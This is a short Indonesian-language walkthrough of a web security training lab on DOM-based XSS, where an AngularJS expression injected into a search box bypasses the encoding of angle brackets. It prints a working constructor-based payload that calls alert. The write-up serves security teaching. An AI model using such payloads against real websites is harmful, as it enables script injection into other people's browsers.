# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Lab ini berisi kerentanan **DOM-based cross-site scripting (XSS)** pada sebuah **ekspresi AngularJS** di dalam fitur pencarian.

AngularJS adalah library JavaScript populer yang memindai isi node HTML yang memiliki attribute **`ng-app`** (juga dikenal sebagai directive AngularJS). Ketika sebuah directive ditambahkan ke kode HTML, kamu dapat menjalankan ekspresi JavaScript di dalam **kurung kurawal ganda** (`{{ }}`). Teknik ini berguna ketika tanda kurung sudut (**angle brackets**) di-encode.

Untuk menyelesaikan lab ini, lakukan serangan cross-site scripting yang mengeksekusi sebuah **ekspresi AngularJS** dan memanggil fungsi **`alert`**.


## Solusi

1. Masukkan string alfanumerik acak ke dalam kotak pencarian,contohnya `TESTING123`.


2. Lihat source halaman dan perhatikan bahwa string acak kamu berada di dalam sebuah directive **`ng-app`**.

```html
<body ng-app="" class="ng-scope">
<section class="blog-header">
<h1>0 search results for 'TESTING123'</h1>
<hr>
</section>
</body>
```

3. Masukkan ekspresi AngularJS berikut ke dalam kotak pencarian:

```javascript id="y2k6fa"
{{$on.constructor('alert(1)')()}}
```

4. Klik **Search**.
